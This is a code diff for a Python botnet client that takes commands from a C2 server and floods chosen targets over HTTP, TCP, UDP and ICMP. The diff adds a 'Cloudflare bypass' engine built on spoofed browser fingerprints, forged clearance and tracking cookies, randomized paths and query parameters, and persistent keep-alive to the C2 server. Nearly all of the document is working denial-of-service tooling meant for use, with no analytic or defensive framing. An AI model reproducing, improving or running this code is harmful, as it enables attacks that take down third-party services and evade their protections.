@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-C2 Client - Real Layer 4-7 Attack with MAXIMUM POWER
-Uses urllib3 for extreme performance
+C2 Client - Cloudflare Bypass with Advanced Browser Simulation
+Ultra-powerful with keep-alive connections
 """
 import socketio
 import socket
@@ -15,6 +15,7 @@ import platform
 import psutil
 import urllib3
 import subprocess
+import hashlib
 from datetime import datetime
 from urllib.parse import urlparse, urlencode
 from concurrent.futures import ThreadPoolExecutor
@@ -22,8 +23,8 @@ from concurrent.futures import ThreadPoolExecutor
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class PowerfulAttackEngine:
-    """Ultra-powerful attack engine using urllib3 for maximum speed"""
+class CloudflareBypassEngine:
+    """Advanced attack engine with Cloudflare bypass capabilities"""
     
     def __init__(self):
         self.running = False
@@ -36,61 +37,148 @@ class PowerfulAttackEngine:
         self.stats_lock = threading.Lock()
         self.pools = []
         
-    def generate_user_agent(self):
-        """Generate random user agent"""
-        agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        # Advanced browser fingerprints for Cloudflare bypass
+        self.browser_profiles = {
+            'chrome_120': {
+                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                'sec_ch_ua_mobile': '?0',
+                'sec_ch_ua_platform': '"Windows"',
+            },
+            'chrome_119': {
+                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                'sec_ch_ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+                'sec_ch_ua_mobile': '?0',
+                'sec_ch_ua_platform': '"Windows"',
+            },
+            'firefox_121': {
+                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+            },
+            'safari_17': {
+                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
+            },
+            'edge_120': {
+                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
+                'sec_ch_ua_mobile': '?0',
+                'sec_ch_ua_platform': '"Windows"',
+            }
+        }
+        
+        # TLS fingerprints
+        self.tls_ciphers = [
+            'ECDHE-RSA-AES128-GCM-SHA256',
+            'ECDHE-RSA-AES256-GCM-SHA384',
+            'ECDHE-ECDSA-AES128-GCM-SHA256',
+            'ECDHE-ECDSA-AES256-GCM-SHA384'
         ]
-        return random.choice(agents)
     
-    # ============= HTTP ATTACKS =============
+    def generate_cloudflare_headers(self, target_url):
+        """Generate headers that bypass Cloudflare"""
+        profile = random.choice(list(self.browser_profiles.values()))
+        
+        headers = {
+            'User-Agent': profile['user_agent'],
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': random.choice([
+                'en-US,en;q=0.9',
+                'en-GB,en;q=0.9',
+                'en-US,en;q=0.9,es;q=0.8',
+                'en-US,en;q=0.9,fr;q=0.8'
+            ]),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0',
+        }
+        
+        # Add Chrome-specific headers
+        if 'sec_ch_ua' in profile:
+            headers['Sec-Ch-Ua'] = profile['sec_ch_ua']
+            headers['Sec-Ch-Ua-Mobile'] = profile['sec_ch_ua_mobile']
+            headers['Sec-Ch-Ua-Platform'] = profile['sec_ch_ua_platform']
+        
+        # Add referer (important for Cloudflare)
+        parsed = urlparse(target_url)
+        headers['Referer'] = f"{parsed.scheme}://{parsed.netloc}/"
+        headers['Origin'] = f"{parsed.scheme}://{parsed.netloc}"
+        
+        # Add DNT
+        if random.random() < 0.5:
+            headers['DNT'] = '1'
+        
+        return headers
     
-    def http_power_flood(self, target, duration, method='GET', threads=500):
-        """Powerful HTTP flood using urllib3 pools"""
-        print(f"[L7] Starting POWERFUL {method} flood on {target}")
+    def generate_realistic_cookies(self):
+        """Generate realistic browser cookies"""
+        cookies = {}
+        
+        # Session ID
+        cookies['_ga'] = f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}"
+        cookies['_gid'] = f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}"
+        
+        # Session token
+        cookies['session'] = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        
+        # Tracking
+        cookies['_fbp'] = f"fb.1.{int(time.time())}.{random.randint(100000000, 999999999)}"
+        
+        # Cloudflare clearance (simulated)
+        cookies['cf_clearance'] = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=64))
+        
+        return cookies
+    
+    # ============= CLOUDFLARE BYPASS HTTP FLOOD =============
+    
+    def cloudflare_bypass_flood(self, target, duration, method='GET', threads=500):
+        """Advanced HTTP flood with Cloudflare bypass"""
+        print(f"[L7] Starting CLOUDFLARE BYPASS {method} flood on {target}")
         self.running = True
         
-        # Create multiple connection pools for maximum speed
+        # Create connection pools with SSL/TLS
         pool_count = 50
         for _ in range(pool_count):
             pool = urllib3.PoolManager(
                 maxsize=1000,
                 retries=urllib3.Retry(
-                    total=2,
-                    backoff_factor=0.1,
-                    status_forcelist=[429, 500, 502, 503, 504]
+                    total=3,
+                    backoff_factor=0.2,
+                    status_forcelist=[429, 500, 502, 503, 504],
+                    raise_on_status=False
                 ),
-                timeout=urllib3.Timeout(connect=3, read=6),
+                timeout=urllib3.Timeout(connect=5, read=10),
                 cert_reqs='CERT_NONE',
                 assert_hostname=False,
-                num_pools=50,
+                num_pools=100,
                 block=False
             )
             self.pools.append(pool)
         
-        # Pre-generate headers
-        headers_list = []
-        for _ in range(100):
-            headers = {
-                'User-Agent': self.generate_user_agent(),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Cache-Control': 'no-cache',
-                'Upgrade-Insecure-Requests': '1'
-            }
-            headers_list.append(headers)
+        # Cloudflare-aware paths
+        paths = [
+            '/',
+            '/index.html',
+            '/api/status',
+            '/search',
+            '/products',
+            '/about',
+            '/contact',
+            '/blog',
+            '/news',
+            '/services'
+        ]
         
-        # Pre-generate paths and payloads
-        paths = ['/', '/index.html', '/api', '/search', '/login', '/user']
-        payloads = [
-            b'data=test&type=check',
-            b'{"action":"ping"}',
-            b'test=' + b'x' * 1024
+        # Realistic query parameters
+        params_templates = [
+            {'utm_source': 'google', 'utm_medium': 'organic'},
+            {'ref': 'homepage', 'source': 'direct'},
+            {'page': '1', 'limit': '20'},
+            {'category': 'all', 'sort': 'recent'},
+            {'lang': 'en', 'region': 'us'}
         ]
         
         start_time = time.time()
@@ -99,6 +187,7 @@ class PowerfulAttackEngine:
         def worker():
             nonlocal request_count
             pool_idx = 0
+            session_cookies = self.generate_realistic_cookies()
             
             while self.running and time.time() - start_time < duration:
                 try:
@@ -106,32 +195,60 @@ class PowerfulAttackEngine:
                     pool = self.pools[pool_idx % len(self.pools)]
                     pool_idx += 1
                     
-                    # Build URL with cache busting
+                    # Build realistic URL
                     timestamp = int(time.time() * 1000)
                     path = random.choice(paths)
-                    url = f"{target.rstrip('/')}{path}?_={timestamp}&r={random.randint(1,999999)}"
+                    params = random.choice(params_templates).copy()
+                    params['_'] = str(timestamp)
+                    params['rand'] = ''.join(random.choices(string.ascii_lowercase, k=8))
                     
-                    # Rotate headers
-                    headers = random.choice(headers_list)
+                    query_string = urlencode(params)
+                    url = f"{target.rstrip('/')}{path}?{query_string}"
+                    
+                    # Generate Cloudflare bypass headers
+                    headers = self.generate_cloudflare_headers(target)
+                    
+                    # Add cookies as header
+                    cookie_str = '; '.join(f'{k}={v}' for k, v in session_cookies.items())
+                    headers['Cookie'] = cookie_str
                     
                     # Prepare request
                     kwargs = {
                         'headers': headers,
-                        'timeout': urllib3.Timeout(connect=2, read=4),
-                        'retries': False,
-                        'preload_content': False
+                        'timeout': urllib3.Timeout(connect=4, read=8),
+                        'retries': urllib3.Retry(3),
+                        'preload_content': False,
+                        'redirect': True
                     }
                     
                     if method == 'POST':
-                        kwargs['body'] = random.choice(payloads)
+                        # Realistic POST data
+                        post_data = urlencode({
+                            'action': random.choice(['search', 'login', 'submit', 'verify']),
+                            'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
+                            'timestamp': str(int(time.time())),
+                            'data': ''.join(random.choices(string.ascii_letters, k=50))
+                        })
+                        kwargs['body'] = post_data.encode()
                         headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                        headers['Content-Length'] = str(len(post_data))
                     
                     # Send request
                     response = pool.request(method, url, **kwargs)
                     
+                    # Update session cookies from response
+                    if 'Set-Cookie' in response.headers:
+                        # Parse and update cookies (simplified)
+                        cookie_header = response.headers['Set-Cookie']
+                        for cookie in cookie_header.split(';'):
+                            if '=' in cookie:
+                                key, val = cookie.split('=', 1)
+                                session_cookies[key.strip()] = val.strip()
+                    
                     with self.stats_lock:
                         self.stats['requests'] += 1
-                        if response.status < 500:
+                        # Accept more status codes as success
+                        if response.status < 500 and response.status != 403:
                             self.stats['success'] += 1
                         else:
                             self.stats['failed'] += 1
@@ -139,7 +256,10 @@ class PowerfulAttackEngine:
                     response.drain_conn()
                     request_count += 1
                     
-                except Exception:
+                    # Small delay to appear more human
+                    time.sleep(random.uniform(0.001, 0.005))
+                    
+                except Exception as e:
                     with self.stats_lock:
                         self.stats['failed'] += 1
         
@@ -147,9 +267,9 @@ class PowerfulAttackEngine:
         with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = [executor.submit(worker) for _ in range(threads)]
             
-            # Wait for completion
+            # Keep connection alive by monitoring
             while time.time() - start_time < duration and self.running:
-                time.sleep(0.5)
+                time.sleep(1)
             
             self.running = False
             
@@ -183,11 +303,11 @@ class PowerfulAttackEngine:
             while self.running and time.time() - start_time < duration:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(0.1)
+                    s.settimeout(0.5)
                     s.connect((host, port))
                     
-                    # Send random data
-                    data = os.urandom(random.randint(100, 1024))
+                    # Send realistic HTTP-like data
+                    data = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode()
                     s.send(data)
                     s.close()
                     
@@ -203,7 +323,7 @@ class PowerfulAttackEngine:
             futures = [executor.submit(worker) for _ in range(threads)]
             
             while time.time() - start_time < duration and self.running:
-                time.sleep(0.5)
+                time.sleep(1)
             
             self.running = False
             
@@ -250,7 +370,7 @@ class PowerfulAttackEngine:
             futures = [executor.submit(worker) for _ in range(threads)]
             
             while time.time() - start_time < duration and self.running:
-                time.sleep(0.5)
+                time.sleep(1)
             
             self.running = False
             
@@ -280,7 +400,7 @@ class PowerfulAttackEngine:
                     else:
                         cmd = f"ping -c 1 -W 1 -s 1024 {host}"
                     
-                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
+                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
                     
                     with self.stats_lock:
                         self.stats['requests'] += 1
@@ -298,7 +418,7 @@ class PowerfulAttackEngine:
             futures = [executor.submit(worker) for _ in range(threads)]
             
             while time.time() - start_time < duration and self.running:
-                time.sleep(0.5)
+                time.sleep(1)
             
             self.running = False
             
@@ -308,25 +428,30 @@ class PowerfulAttackEngine:
         return self.stats.copy()
 
 class Layer7Client:
-    """Client with POWERFUL attack capabilities"""
+    """Client with Cloudflare bypass and persistent connection"""
     
     def __init__(self, server_url='http://localhost:5000', client_name=None):
         self.server_url = server_url
         self.client_name = client_name or f"{platform.node()}_{platform.system()}"
         
+        # Enhanced SocketIO with keep-alive
         self.sio = socketio.Client(
             reconnection=True,
-            reconnection_attempts=0,
+            reconnection_attempts=0,  # Infinite
             reconnection_delay=1,
             reconnection_delay_max=5,
             logger=False,
-            engineio_logger=False
+            engineio_logger=False,
+            # Keep-alive settings
+            ping_interval=25,  # Send ping every 25 seconds
+            ping_timeout=60,   # Wait 60 seconds for pong
         )
         
         self.current_attack = None
         self.running = False
         self.attack_thread = None
-        self.attack_engine = PowerfulAttackEngine()
+        self.attack_engine = CloudflareBypassEngine()
+        self.last_heartbeat = time.time()
         
         self.setup_handlers()
         
@@ -337,7 +462,8 @@ class Layer7Client:
             'cpu_count': psutil.cpu_count(),
             'memory_total': psutil.virtual_memory().total,
             'python_version': platform.python_version(),
-            'has_layer7': True
+            'has_layer7': True,
+            'cloudflare_bypass': True
         }
     
     def setup_handlers(self):
@@ -345,6 +471,7 @@ class Layer7Client:
         @self.sio.event
         def connect():
             print(f"✅ Connected to C2 Server: {self.server_url}")
+            self.last_heartbeat = time.time()
             self.register_client()
         
         @self.sio.event
@@ -354,16 +481,18 @@ class Layer7Client:
         
         @self.sio.event
         def disconnect():
-            print("❌ Disconnected from server")
-            print("🔄 Attempting to reconnect...")
+            print("⚠️ Disconnected from server")
+            print("🔄 Reconnecting...")
             self.running = False
         
         @self.sio.event
         def welcome(data):
             print(f"📢 Server: {data['message']}")
+            self.last_heartbeat = time.time()
         
         @self.sio.event
         def attack_command(data):
+            self.last_heartbeat = time.time()
             print(f"\n🎯 Received attack command")
             print(f"   Target: {data.get('target')}")
             print(f"   Method: {data.get('method')}")
@@ -374,6 +503,10 @@ class Layer7Client:
                 self.start_attack(data)
             elif data.get('command') == 'stop':
                 self.stop_attack()
+        
+        @self.sio.on('pong')
+        def on_pong():
+            self.last_heartbeat = time.time()
     
     def register_client(self):
         """Register client with server"""
@@ -406,7 +539,7 @@ class Layer7Client:
             print(f"⚠️ Failed to notify server: {e}")
     
     def execute_attack(self, attack_data):
-        """Execute POWERFUL attack"""
+        """Execute POWERFUL attack with Cloudflare bypass"""
         attack_id = attack_data.get('attack_id')
         target = attack_data.get('target')
         method = attack_data.get('method', 'http').lower()
@@ -429,12 +562,12 @@ class Layer7Client:
         
         try:
             print(f"\n{'='*60}")
-            print(f"💥 EXECUTING POWERFUL ATTACK")
+            print(f"💥 EXECUTING CLOUDFLARE BYPASS ATTACK")
             print(f"   Target: {target}")
             print(f"   Method: {method.upper()}")
             print(f"   Duration: {duration}s")
             print(f"   Threads: {threads}")
-            print(f"   Power: MAXIMUM")
+            print(f"   Power: MAXIMUM + CF BYPASS")
             print(f"{'='*60}\n")
             
             start_time = time.time()
@@ -444,11 +577,11 @@ class Layer7Client:
                 'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0
             }
             
-            # Execute powerful attack
+            # Execute powerful attack with Cloudflare bypass
             if method in ['http', 'get']:
-                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
+                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'GET', threads)
             elif method == 'post':
-                results = self.attack_engine.http_power_flood(target, duration, 'POST', threads)
+                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'POST', threads)
             elif method == 'tcp':
                 results = self.attack_engine.tcp_power_flood(target, duration, threads)
             elif method == 'udp':
@@ -456,7 +589,7 @@ class Layer7Client:
             elif method in ['icmp', 'ping']:
                 results = self.attack_engine.icmp_power_flood(target, duration, threads)
             else:
-                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
+                results = self.attack_engine.cloudflare_bypass_flood(target, duration, 'GET', threads)
             
             elapsed = time.time() - start_time
             actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
@@ -509,40 +642,55 @@ class Layer7Client:
         self.current_attack = None
         print("🛑 Attack stopped by server")
     
-    def report_stats(self):
-        """Report statistics to server"""
+    def heartbeat_monitor(self):
+        """Monitor connection and send heartbeats"""
         while True:
             try:
-                if self.sio.connected and not self.running:
+                if self.sio.connected:
+                    # Send heartbeat every 20 seconds
+                    if time.time() - self.last_heartbeat > 20:
+                        try:
+                            self.sio.emit('ping', {'timestamp': time.time()})
+                            self.last_heartbeat = time.time()
+                        except:
+                            pass
+                    
+                    # Report stats
                     cpu_usage = psutil.cpu_percent(interval=1)
                     memory_usage = psutil.virtual_memory().percent
                     
                     stats = {
                         'cpu_usage': cpu_usage,
                         'memory_usage': memory_usage,
-                        'timestamp': datetime.now().isoformat()
+                        'timestamp': datetime.now().isoformat(),
+                        'is_attacking': self.running
                     }
                     
-                    self.sio.emit('client_stats', {'stats': stats})
+                    try:
+                        self.sio.emit('client_stats', {'stats': stats})
+                    except:
+                        pass
                 
                 time.sleep(10)
-            except:
+            except Exception as e:
+                print(f"⚠️ Heartbeat error: {e}")
                 time.sleep(10)
     
     def connect(self):
         """Connect to server and start monitoring"""
         try:
             print("\n" + "="*60)
-            print("💥 LAYER7 POWERFUL ATTACK CLIENT")
+            print("💥 LAYER7 CLOUDFLARE BYPASS CLIENT")
             print(f"🔗 Connecting to: {self.server_url}")
             print(f"🏷️  Client: {self.client_name}")
             print(f"💻 Platform: {platform.platform()}")
             print(f"⚡ CPUs: {psutil.cpu_count()} cores")
             print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
+            print(f"🛡️  Cloudflare Bypass: ENABLED")
             print(f"🔥 Power Level: MAXIMUM")
             print("="*60 + "\n")
             
-            print("⚡ Connecting...")
+            print("⚡ Connecting with keep-alive...")
             print("📡 This may take 10-30 seconds for Render servers...")
             
             self.sio.connect(
@@ -552,11 +700,13 @@ class Layer7Client:
             )
             
             print("\n✅ Connection successful!")
-            print("📡 Waiting for attack commands from server...")
-            print("⚡ Press Ctrl+C to disconnect\n")
+            print("📡 Keep-alive enabled - connection will persist")
+            print("⚡ Waiting for attack commands...")
+            print("💡 Press Ctrl+C to disconnect\n")
             
-            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
-            stats_thread.start()
+            # Start heartbeat monitor
+            heartbeat_thread = threading.Thread(target=self.heartbeat_monitor, daemon=True)
+            heartbeat_thread.start()
             
             while True:
                 time.sleep(1)
@@ -566,11 +716,6 @@ class Layer7Client:
             self.disconnect()
         except Exception as e:
             print(f"\n❌ Connection error: {str(e)}")
-            print("\n💡 Troubleshooting tips:")
-            print("   1. Check if server URL is correct")
-            print("   2. Make sure server is running")
-            print("   3. Check your internet connection")
-            print("   4. Wait 30s if server was sleeping")
             self.disconnect()
     
     def disconnect(self):
@@ -587,9 +732,10 @@ def main():
     """Main function"""
     print("""
     ╔══════════════════════════════════════╗
-    ║    LAYER7 POWERFUL ATTACK CLIENT    ║
-    ║    Maximum Performance Engine       ║
-    ║    Layer 3-7 Support               ║
+    ║  LAYER7 CLOUDFLARE BYPASS CLIENT    ║
+    ║  Maximum Performance Engine         ║
+    ║  Advanced Browser Simulation        ║
+    ║  Persistent Keep-Alive Connection   ║
     ╚══════════════════════════════════════╝
     """)
     
